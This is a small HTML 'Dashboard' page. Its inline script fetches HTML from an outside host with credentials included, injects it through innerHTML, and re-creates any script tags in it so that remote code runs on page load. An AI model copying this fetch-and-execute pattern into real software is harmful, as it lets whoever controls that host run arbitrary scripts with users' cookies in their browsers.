<!DOCTYPE html>
<html>
<head>
  <title>Dashboard</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div id="app">Loading dashboard...</div>

  <script>
    async function loadDashboard() {
      const res = await fetch(
        'https://api.honhonstinks.lol/requestdashboard',
        { credentials: 'include' }
      );

      if (!res.ok) {
        document.getElementById('app').innerHTML =
          '<h2>Not authorized</h2>';
        return;
      }

      const html = await res.text();
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      document.getElementById('app').innerHTML = doc.body.innerHTML;
      doc.body.querySelectorAll('script').forEach((script) => {
        const newScript = document.createElement('script');
        if (script.src) {
          newScript.src = script.src;
        } else {
          newScript.textContent = script.textContent;
        }
        document.getElementById('app').appendChild(newScript);
      });
    }

    loadDashboard();
  </script>
</body>
</html>
